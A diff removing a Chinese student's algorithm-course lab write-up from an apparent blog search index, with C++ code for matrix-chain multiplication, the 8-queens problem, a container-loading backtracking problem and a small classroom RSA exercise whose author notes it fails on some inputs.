-   for(int i=0; i&lt;n; i++)
-   {  m[i]=new int [n];   m[i][i]=0;
-      s[i]=new int [n];   s[i][i]=0;
-         p[i]=q[i];
-   }
-   p[n]=q[n];
-}
-
-int MatrixChain::MChain()
-{  //求A[0:n-1]的最优解值
-   //for (int i=0;i&lt;n; i++) m[i][i]=0;  //由于构造函数中有了m[i][i]=0的语句，这条可以删除，且备忘录方法输出的s数组对角线就是0，否则不正确。
-   for (int r=2; r&lt;=n; r++)
-     for (int i=0; i&lt;=n-r; i++) 
-                    {   int j=i+r-1;
-           m[i][j]=m[i+1][j]+p[i]*p[i+1]*p[j+1];  //m[i][j] 的初值
-            s[i][j]=i;
-            for (int k=i+1;    k&lt;j; k++) 
-                                {  int t=m[i][k]+m[k+1][j]+p[i]*p[k+1]*p[j+1];
-                 if (t&lt;m[i][j]) 
-                                            {  m[i][j]=t;   s[i][j]=k;
-                                            }
-                                }
-                    }
-      return m[0][n-1];
-}
-
-void MatrixChain::Traceback(int i,int j)
-{
-    if(i==j)
-    {
-        cout &lt;&lt; 'A' &lt;&lt; i;
-        return;
-    }
-    if(i&lt;s[i][j])
-        cout &lt;&lt; '(';
-    Traceback(i,s[i][j]);
-    if(i&lt;s[i][j])
-        cout &lt;&lt; ')';
-    if(s[i][j]+1&lt;j)
-        cout &lt;&lt; '(';
-    Traceback(s[i][j]+1,j);
-    if(s[i][j]+1&lt;j)
-        cout &lt;&lt; ')';
-
-}
-
-void MatrixChain::Traceback()
-{
-    cout &lt;&lt; '(';
-    Traceback(0,n-1);
-    cout &lt;&lt; ')';
-    cout &lt;&lt; endl;
-}
-
-int MatrixChain::LookupChain(int i, int j)
-{   if (m[i][j]&gt;0) return m[i][j];                  //子问题已经求解，直接引用
-      if(i==j) return 0;                                      //单一矩阵无须计算
-      int u=LookupChain(i+1, j)+p[i]*p[i+1]*p[j+1]; //按式（7-9）求最小值
-    s[i][j]=i;
-    for (int k=i+1; k&lt;j; k++) 
-            {  int t=LookupChain(i, k)+LookupChain(k+1, j)+p[i]*p[k+1]*p[j+1];
-         if (t&lt;u) 
-                        {  u=t;   s[i][j]=k;
-                        }
-            }
-    m[i][j]=u; return u;                           //保存并返回子最优解值
-}
-
-int MatrixChain::LookupChain()
-{  
-    return LookupChain(0, n-1);     //返回A[0:n-1]的最优解值
-}
-
-void MatrixChain::Output()
-{  int i,j;
-  
-   cout&lt;&lt;"  m="&lt;&lt;endl;
-   cout&lt;&lt;"  ";
-   for(j=0; j&lt;n; j++)
-                  if(j&lt;2) cout&lt;&lt;setw(4)&lt;&lt;j;
-                        else cout&lt;&lt;setw(6)&lt;&lt;j;
-   cout&lt;&lt;endl;
-
-   for(i=0; i&lt;n; i++)
-   {  cout&lt;&lt;"  "&lt;&lt;i&lt;&lt;" ";
-      for(j=0; j&lt;n; j++)
-                        {  if(i&lt;j) cout&lt;&lt;setw(6)&lt;&lt;m[i][j];  //setw(6), 指定输出域宽为6
-         else if(i==j) cout&lt;&lt;setw(2)&lt;&lt;m[i][j];
-            else cout&lt;&lt;setw(6)&lt;&lt;" ";
-                        }
-         cout&lt;&lt;endl;
-   }
-
-   cout&lt;&lt;"  s="&lt;&lt;endl;
-   cout&lt;&lt;"    ";
-   for(j=0; j&lt;n; j++) cout&lt;&lt;j&lt;&lt;" ";
-   cout&lt;&lt;endl;
-   for(i=0; i&lt;n; i++)
-   {  cout&lt;&lt;"  "&lt;&lt;i&lt;&lt;" ";
-      for(j=0; j&lt;n; j++)
-      {  if(i&lt;=j) cout&lt;&lt;s[i][j]&lt;&lt;" ";
-         else cout&lt;&lt;"  ";
-      }
-      cout&lt;&lt;endl;
-   }
-}
-
-int main()
-{ 
-//   int nn=6,k,k2;
-//   int pp[7]={30,35,15,5,10,20,25};
-int pp[MaxLen];
-int nn,i,k, k2;
-cout &lt;&lt; "  请输入连乘矩阵的个数" &lt;&lt; endl;
-scanf("%d", &amp;nn);
-cout &lt;&lt; "  请输入连乘矩阵的"&lt;&lt;nn+1&lt;&lt;"个维数(以空格隔开)"&lt;&lt; endl;
-for (i = 1; i &lt;= nn+1;i++)
-    {
-        scanf("%d", &amp;pp[i-1]);
-    }
-MatrixChain mm(nn, pp);
-k = mm.MChain();
-cout &lt;&lt; "  最少数乘次数k=" &lt;&lt; k &lt;&lt; endl; //最少数乘次数k=15125
-mm.Traceback();                          //矩阵连乘次序:(((A0(A1A2))((A3A4)A5))
-cout &lt;&lt; endl;
-mm.Output();
-k2 = mm.LookupChain();
-cout &lt;&lt;endl&lt;&lt; "采用备忘录方法：" &lt;&lt; endl;
-cout &lt;&lt; "  最少数乘次数k2=" &lt;&lt; k2 &lt;&lt; endl; //最少数乘次数k=15125
-mm.Traceback();                            //矩阵连乘次序:(((A0(A1A2))((A3A4)A5))
-cout &lt;&lt; endl;
-mm.Output();
-
-  
-}
-</code></pre>
-<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><ul>
-<li><p>用回溯法求解 8- 皇后问题，使放置在 8*8 棋盘上的 8 个皇后彼此不受攻击，即：任何两个皇后都不在同一行、同一列或同一斜线上。请输出 8-皇后问题的所有可行解。</p>
-</li>
-<li><p>用回溯法编写一个递归程序解决如下装载问题： 有 n 个集装箱要装上 2 艘载重分别为 c1和 c2的轮船，其中集装箱 i 的重量为 wi（1≤ i ≤ n） ，且                                ,问是否有一个合理的装载方案可以将这 n 个集装箱装上这 2 艘轮船？如果有，请给出装载方案</p>
-<p>提示 ：参考 子集和数问题的求解方法。 </p>
-<p>举例 ： 当 n=3， c1=c2=50， 且 w=[10,40,40]时， 可以将集装箱 1 和 2 装到第一艘轮船上，集装箱 3 装到第二艘轮船上；如果 w=[20,40,40]时，无法将这 3 个集装箱都装上轮船。</p>
-</li>
-</ul>
-<h3 id="1-8皇后问题"><a href="#1-8皇后问题" class="headerlink" title="1.8皇后问题"></a>1.8皇后问题</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
-#include &lt;cstdio&gt;
-#include &lt;cstdlib&gt;
-#include &lt;cmath&gt;
-#define N 8        // 8 皇后
-using namespace std;
-int count = 0,count2=0;
-
-//判定两个皇后是否在同一列或在同一斜线上
-bool Place(int k, int i, int *x)
-{
-   for(int j = 0; j &lt; k; j++)
-   if((x[j] == i) || (abs(x[j] - i) == abs(j - k))) 
-       return false;
-   return true;
-}
-
-//递归函数（求解n皇后问题）
-void NQueens(int k, int n, int *x) 
-{
-    for(int i = 0; i &lt; n; i++)  //显式约束的第一种观点，x[k] = 0,1,···,n-1
-    {
-        if(Place(k, i, x))  //约束函数
-        {
-            x[k] = i;
-            if(k == n - 1)    
-            {
-                for(i = 0; i &lt; n; i++) 
-                  cout &lt;&lt; x[i] &lt;&lt; " ";  //输出一个可行解
-                cout &lt;&lt; endl;
-                count ++;
-            }
-            else
-            {
-               NQueens(k + 1, n, x);  //深度优先进入下一层
-            }
-       }
-    }
-}
-
-void NQueens(int n, int *x)
-{
-    NQueens(0, n, x);
-}
-
-//求非对称解
-void NQueens2(int k, int n, int *x) 
-{
-    static int temp=n;        //求非对称的解
-    if(k==0)
-        n = int(temp / 2);
-    else
-        n = temp;
-    for(int i = 0; i &lt; n; i++)  //显式约束的第一种观点，x[k] = 0,1,···,n-1
-    {
-        if(Place(k, i, x))  //约束函数
-        {
-            x[k] = i;
-            if(k == n - 1)    
-            {
-                for(i = 0; i &lt; n; i++) 
-                  cout &lt;&lt; x[i] &lt;&lt; " ";  //输出一个可行解
-                cout &lt;&lt; endl;
-                count2 ++;
-            }
-            else
-            {
-               NQueens2(k + 1, n, x);  //深度优先进入下一层
-            }
-       }
-    }
-}
-
-void NQueens2(int n, int *x)
-{
-    NQueens2(0, n, x);
-}
-
-int main()
-{
-    int queens[N];  //8皇后
-    // int count = 0,count2=0;
-    for(int i = 0; i &lt; N; i++) 
-        queens[i] = -1;
-    NQueens(N, queens);
-    cout &lt;&lt;endl&lt;&lt; "可行解共有: " &lt;&lt; count &lt;&lt;" 组"&lt;&lt; endl;
-    cout &lt;&lt; endl&lt;&lt; " 仅输出非对称解 : " &lt;&lt; endl;
-    NQueens2(N, queens);
-    cout &lt;&lt;endl&lt;&lt; "非对称可行解共有: " &lt;&lt; count2 &lt;&lt;" 组"&lt;&lt; endl;
-    getchar();
-    return 0;
-}
-</code></pre>
-<h3 id="2-装载问题"><a href="#2-装载问题" class="headerlink" title="2.装载问题"></a>2.装载问题</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
-
-using namespace std;
-
-template &lt;class T&gt; 
-class Loading  
-{ 
-private: 
-  int  n,  // 集装箱数 
-   x[100],   // 当前解 
-   bestx[100]; // 当前 第一艘 船的最优解 
-T  c1, // 第一艘轮船的核定载重量 
-   c2, // 第二艘轮船的核定载重量 
-   w[100], // 集装箱重量数组 
-   total,  // 所有集装箱重量之和 
-   cw,   // 当前 第一艘船的 载重量 
-   bestw, // 当前 第一艘 船的最优载重量 
-   r;   // 剩余集装箱总重量 
-public: 
-  Loading()   // 构造函数 
-  {
-    cout&lt;&lt;"请输入集装箱的数量："&lt;&lt;endl;
-    cin&gt;&gt;n;
-    cout&lt;&lt;"请输入轮船1、2的载重量："&lt;&lt;endl;
-    cin&gt;&gt;c1&gt;&gt;c2;
-    cout&lt;&lt;"请输入每个集装箱的重量："&lt;&lt;endl;
-    for(int i=1;i&lt;=n;i++)
-    {
-        cin&gt;&gt;w[i];
-    }
-
-    r=0;
-    cw=0;
-    bestw=0;
-    for(int i=1;i&lt;=n;i++)
-    {
-        r=r+w[i];
-    }
-  }
-
-      ~Loading() // 析构函数
-      {
-      }
-    void Backtrack(int i); // 找到最接近第一艘轮船载重c1 的最佳装载方案，
-                                // 最优载重值bestw ，最优解数组bestx 。
-    void Show();          // 输出整个装载方案 
-}; 
- 
-template &lt;class T&gt; 
-void Loading&lt;T&gt;::Backtrack(int i) 
-{  
- if(i&gt;n) //判断是否达到叶子节点
-    { //到达叶子节点
-        if(cw&gt;bestw)
-        {
-            for(int j=1;j&lt;=n;j++)
-            {
-                bestx[j]=x[j];   //把当前解赋给最优解
-            }
-            bestw=cw;    //把当前载重量赋给当前最优载重量
-        }
-    }
-
-    r=r-w[i];  //剩余集装箱的总重量
-    if(cw+w[i]&lt;=c1) //判断该集装箱到底放不放
-    {
-        x[i]=1;
-        cw=cw+w[i];
-        Backtrack(i+1);
-        //当节点i的子树延伸结束时要返回i节点
-        x[i]=0;
-        cw=cw-w[i];
-
-    }
-    if(cw+r&gt;bestw) //判断先不放该集装箱后是否还有可行解
-    {
-        x[i]=0;
-        Backtrack(i+1);
-    }
-    r=r+w[i];
-
-} 
- 
-template &lt;class T&gt; 
-void Loading&lt;T&gt;::Show() 
-{
-    int c2w=0;
-    for(int i=1;i&lt;=n;i++)
-    {
-        if(bestx[i]==0)
-        {
-            c2w=c2w+w[i];
-        }
-    }
-    if(c2w&gt;c2)
-        cout&lt;&lt;endl&lt;&lt;"装载失败！无法装下所有的集装箱！"&lt;&lt;endl;
-    else
-    {
-        cout &lt;&lt; endl&lt;&lt;"成功装载！" &lt;&lt; endl;
-        cout&lt;&lt;"第一艘船所装的集装箱为："&lt;&lt;endl;
-        for(int i=1;i&lt;=n;i++)
-        {
-            if(bestx[i]==1)
-                cout&lt;&lt;i&lt;&lt;" ";
-        }
-        cout&lt;&lt;endl;
-        cout&lt;&lt;"第二艘船所装的集装箱为："&lt;&lt;endl;
-        for(int i=1;i&lt;=n;i++)
-        {
-            if(bestx[i]!=1)
-                cout&lt;&lt;i&lt;&lt;" ";
-        }
-
-    }
-
-} 
- 
-int  main() 
-{ 
-  Loading&lt;int&gt; load;
-  load.~Loading();
-  load.Backtrack(1); 
-  load.Show(); 
-//   system("pause");
-  return 0;
-}
-</code></pre>
-<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h3 id="编程一个简单的RSA加、解密系统。"><a href="#编程一个简单的RSA加、解密系统。" class="headerlink" title="编程一个简单的RSA加、解密系统。"></a>编程一个简单的RSA加、解密系统。</h3><blockquote>
-<ul>
-<li><p>假设用户A选择两个素数p和q，计算得到n=pq和Φ(n)=(p-1)(q-1)。选择一个加密密钥e，它小于Φ(n)且与Φ(n)互素。计算解密密钥 d≡ e-1 mod Φ(n)。则用户A公布公开密钥{e,n}，自己拥有私有密钥{d,n}。</p>
-</li>
-<li><p>用户B使用用户 A 的公开密钥 e 和 n 对报文 M 进行加密，得到 C= Me mod n，并发送给用户 A。</p>
-</li>
-<li><p>用户A收到加密的报文后，使用自己的私有密钥 d 和 n 对加密报文 C 进行解密，恢复得到明文 M=Cd mod n。</p>
-</li>
-</ul>
-</blockquote>
-<h4 id="初始代码"><a href="#初始代码" class="headerlink" title="初始代码"></a>初始代码</h4><pre><code class="line-numbers language-c++">#include &lt;iostream&gt;
-using namespace std;
-int MOD;
-
-//由公开密钥e和n，求私有密钥d
-int ext_euclid(int a, int b, int &amp;x, int &amp;y) 
-{ 
-    if(b == 0)
-    {
-        x = 1;
-        y = 0;
-        return a;
-    }
-    int gcd = ext_euclid(b, a % b, x, y);
-    int t = x % MOD;
-    x = y % MOD;
-    y = ((t - a / b * x) % MOD + MOD) % MOD;
-    return gcd;
-}
-
-int main()
-{
-    int p, q, i, d;
-    cout &lt;&lt; "请输入一个质数 p (如 101) :";
-    cin &gt;&gt; p;
-    cout &lt;&lt; "请输入一个质数 q (如 113) :";
-    cin &gt;&gt; q;
-    int n = p * q;
-    cout&lt;&lt;"分组加密时，每个分组的大小 n 不能超过 p*q=";
-    cout &lt;&lt; n &lt;&lt; endl;
-
-    //求得φ(n)=(p-1)*(q-1)的值
-    MOD = (p - 1) * (q - 1);
-    cout &lt;&lt; "模φ(n)=(p-1)*(q-1)=";
-    cout &lt;&lt; MOD &lt;&lt; endl &lt;&lt; endl;
-
-    //选取与φ(n)互质的公钥e
-    int e;
-    cout &lt;&lt; "输入与φ(n)互质的公钥 e (如 3533):";
-    cin &gt;&gt; e;
-
-    //由e和φ(n)生成私钥d
-    int x, y;
-    ext_euclid(e, MOD, d, y);
-    while(d &lt; 0) 
-        d += MOD;
-    cout &lt;&lt; "通过调用扩展欧几里德算法，求得密钥d为：" &lt;&lt; d &lt;&lt; endl;
-
-    //利用生成的公钥{e,n}对明文M进行加密
-    int M, C;
-    cout &lt;&lt; "现在公钥{e,n}、私钥{d,n}均已生成完毕。\n\n请输入需要传输的明文内容进行加密(如9726):";
-    cin &gt;&gt; M;
-    C = 1;
-    for(i = 1; i &lt;= e; i++)
-        C = C * M % n;
-    cout &lt;&lt;endl&lt;&lt; "-------------------- 加解密完成 ----------------------" &lt;&lt; endl&lt;&lt;endl;
-    cout &lt;&lt; "明文M= " &lt;&lt; M &lt;&lt; "  经加密后得到密文C=M^e(mod n):  " &lt;&lt; C &lt;&lt; endl;
-
-    //利用生成的私钥私钥{e,n}对密文C进行解密
-    M = 1;
-    for(i = 1; i &lt;= d; i++)
-        M = M * C % n;
-    cout &lt;&lt; "密文C= " &lt;&lt; C &lt;&lt; "  经解密后得到明文M=C^d(mod n):  " &lt;&lt; M &lt;&lt; endl;
-    return 0;
-}
-
-</code></pre>
-<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><blockquote>
-<p>由于第四次实验是在考试周的时候做的，对于RSA的原理也不是很清楚，上面的代码也是借鉴了网上的，自己实验时发现样例能正常运行，但是有的例子没办法正常解码，最近有空又重新研究了一下RSA，记录如下。</p>
-</blockquote>
-<p><strong>原理</strong></p>
-<p>1.公钥与私钥的生成</p>
-<p>（1）选取两个大素数：p和q,(p≠q)；<br>（2）计算n=p*q；<br>（3）利用欧拉(Euler)函数的性质与定理计算Φ(n)=(p-1)·(q-1)</p>
-<blockquote>
-<p><strong>欧拉函数</strong>  设n是自然数，数列1，2，···，n-1中与n互素的数的个数称为n的欧拉函数，记为Φ(n)</p>
-<ul>
-<li>性质    若p是素数，则Φ(p)=(p-1)</li>
-<li>定理     设p和q是素数，对n=pq，有Φ(n)=Φ(p)Φ(q)=p-1)·(q-1)</li>
-</ul>
-</blockquote>
-<p>（4）随机选择加密密钥e(公钥)，使 gcd(Φ(n),e)=1; 1&lt;e&lt;Φ(n)<br>（5）最后，利用Euclid（欧几里得）算法计算解密密钥d，使其满足ed=1（mod Φ(n)）。</p>
-<blockquote>
-<p>后来自己重新敲代码的时候对这一步产生了误解，因为书上给的公式是d=e^(-1)modΦ(n),我把e^(-1)理解成-1次幂了。后来重新看书和查资料，这里描述的应该是e和d是互逆的关系，e^(-1)指的是e是d关于模Φ(n)的乘法逆元</p>
-<p><strong>乘法逆元</strong>    设a是整数，若存在x使得ax≡1(mod n),则称a与x互逆，x是a关于模n的乘法逆元(inverse),记为x=a^(-1)</p>
-</blockquote>
-<p>​    然后将（e，n）公开，即为公钥PK，私人保存好d，即为私钥SK。</p>
-<p>2.加密与解密</p>
-<p>加密公式为<br>$$<br>C=M^e  mod n<br>$$<br>解密公式为<br>$$<br>M^`=C^d  mod n<br>$$<br>一般在计算M^e modn的时候都是计算M mod n然后累乘 e次，这是按模计算原理的推论。</p>
-<h4 id="重新敲的代码"><a href="#重新敲的代码" class="headerlink" title="重新敲的代码"></a>重新敲的代码</h4><blockquote>
-<p>针对之前代码中出现的部分样例解密失败的问题，我认为与未对输入的素数和公钥e与Φ(n)是否互质进行检验有很大关系，于是在新的代码中加入了 JudgePrime 和 IsCoprime 分别进行判断，经过测试，成功解决了之前的解密失败问题（但是对于密文长度较长的情况还是会失败，目前未找到原因）:sob:</p>
-</blockquote>
-<pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
-using namespace std;
-int MOD;
-int JudgePrime(int x)
-{
-    if(x == 1) return 1;
-    for(int i=2;i &lt;=x/2;i++)
-    {
-        if(x % i == 0)
-            return 0;  
-    }
-    return 1;
-}
-
-
-bool isCoprime(int x,int y)
-{
-    if(x==1 &amp;&amp; y==1)//1和1互质
-        return true;
-    else if(x&lt;=0 || y&lt;=0 || x==y)//非正整数都不存在互质的说法
-        return false;
-    else if(x==1 || y==1)//1和任何正整数都互质
-        return true;
-    else
-    {
-        int tmp=0;
-        //使用求商判断法，如果输入的x&lt;y，第一次循环会交换x和y的位置
-        while(true)
-        {
-            tmp=x%y;
-            if(tmp==0)
-            {
-                break;
-            }
-            else
-            {
-                x=y;
-                y=tmp;
-            }
-        }
-        if(y==1)          //最大公约数为1,所以互质
-            return true;
-        else              //最大公约数大于1，所以不互质
-            return false;
- 
-    }
-}
-
-//由公开密钥e和n，求私有密钥d
-int ext_euclid(int a, int b, int &amp;x, int &amp;y) 
-{ 
-    if(b == 0)
-    {
-        x = 1;
-        y = 0;
-        return a;
-    }
-    int gcd = ext_euclid(b, a % b, x, y);
-    int t = x % MOD;
-    x = y % MOD;
-    y = ((t - a / b * x) % MOD + MOD) % MOD;
-    return gcd;
-}
-
-
-int main()
-{
-    int p,q,n,e,d;
-    cout&lt;&lt;"请输入第一个大素数p："&lt;&lt;endl;
-    cin&gt;&gt;p;
-    while(!JudgePrime(p))
-        {
-            cout&lt;&lt;"【 抱歉，您输入的不是素数，请重新输入！】"&lt;&lt;endl;
-             cin&gt;&gt;p;
-        }
-        
-    cout&lt;&lt;"请输入第二个大素数q："&lt;&lt;endl;
-    cin&gt;&gt;q;
-    while(!JudgePrime(q))
-        {
-            cout&lt;&lt;"【 抱歉，您输入的不是素数，请重新输入！】"&lt;&lt;endl;
-             cin&gt;&gt;q;
-        }
-    n=p*q;
-    cout&lt;&lt;"\n乘积 n=p*q= "&lt;&lt;n&lt;&lt;endl;
-    MOD=(p-1)*(q-1);
-    cout&lt;&lt;"φ(n)=(p-1)(q-1)= "&lt;&lt;MOD&lt;&lt;endl;
-    cout&lt;&lt;"\n请输入一个与φ(n)互质的公钥e: "&lt;&lt;endl;
-    cin&gt;&gt;e;
-    while(!isCoprime(e,MOD))
-    {
-        cout&lt;&lt;"【 e与φ(n)不互质，请重新输入！】"&lt;&lt;endl;
-        cin&gt;&gt;e;
-    }
-    //由e和φ(n)生成私钥d
-    int x, y;
-    ext_euclid(e, MOD, d, y);
-    while(d &lt; 0) 
-        d += MOD;
-    cout &lt;&lt; "\n通过调用扩展欧几里德算法，求得密钥d为：" &lt;&lt; d &lt;&lt; endl;
-
-    //利用生成的公钥{e,n}对明文M进行加密
-    int M, C;
-    cout &lt;&lt; "现在公钥{e,n}、私钥{d,n}均已生成完毕。\n\n请输入需要传输的明文内容进行加密:";
-    cin &gt;&gt; M;
-    cout &lt;&lt;endl&lt;&lt; "-------------------- 加解密完成 ----------------------" &lt;&lt; endl&lt;&lt;endl;
-    C = 1;
-    for(int i = 1; i &lt;= e; i++)
-        C = C * M % n;
-    cout &lt;&lt; "明文M= " &lt;&lt; M &lt;&lt; "  经加密后得到密文C=M^e(mod n):  " &lt;&lt; C &lt;&lt; endl;
-
-    //利用生成的私钥私钥{e,n}对密文C进行解密
-    M = 1;
-    for(int i = 1; i &lt;= d; i++)
-        M = M * C % n;
-    cout &lt;&lt; "密文C= " &lt;&lt; C &lt;&lt; "  经解密后得到明文M=C^d(mod n):  " &lt;&lt; M &lt;&lt; endl;
-    return 0;
-
-
-}
-</code></pre>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>算法设计与分析</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
-        <tag>算法设计与分析</tag>
       </tags>
   </entry>
 </search>
